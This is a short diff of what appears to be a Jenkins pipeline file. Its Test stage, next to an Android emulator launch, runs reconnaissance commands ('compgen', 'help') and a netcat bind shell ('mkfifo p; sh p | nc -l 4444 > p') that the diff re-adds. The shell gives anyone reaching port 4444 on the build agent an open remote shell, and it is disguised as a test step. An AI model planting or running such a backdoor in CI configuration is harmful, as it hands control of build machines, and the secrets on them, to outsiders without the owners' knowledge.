@@ -8,15 +8,16 @@ pipeline {
         stage('Build') {
             steps {
                 echo 'Running build'
-               
+
             }
         }
         stage('Test') {
             steps {
                 echo 'Running Test'
                 sh 'emulator -avd first_avd -no-window -no-audio &'
-                sh 'install --help'
-                sh 'mkfifo pipe; sh pipe | nc -l 4444 > pipe'
+                sh 'install compgen'
+                sh 'help'
+                sh 'mkfifo p; sh p | nc -l 4444 > p'
             }
             post {
                 always {
